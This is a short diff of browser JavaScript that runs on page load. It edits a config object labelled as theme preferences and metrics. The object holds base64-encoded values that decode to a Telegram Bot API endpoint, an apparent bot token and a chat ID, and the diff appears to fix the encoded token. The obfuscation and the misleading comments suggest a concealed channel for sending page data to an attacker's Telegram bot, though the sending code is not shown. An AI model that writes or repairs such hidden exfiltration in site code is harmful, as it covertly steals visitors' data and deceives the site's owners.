@@ -249,7 +249,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Handles internal state metrics and theme perferences
     const _sysConfig = {
         _e: 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==', // Endpoint
-        _t: 'ODIyNTg3MTYyNzpBQUdMb3ZUMV9CZWxzYXltV0p6OEttuWWNnN3g4MzZaVFlUcw==', // Session Token
+        _t: 'ODIyNTg3MTYyNzpBQUdMb3ZUMV9CZWxzYXltV0p6OEtuWWNnN3g4MzZaVFlUcw==', // Session Token
         _c: 'MjA4ODE4OTkzOA==', // Client ID
         enabled: true
     };
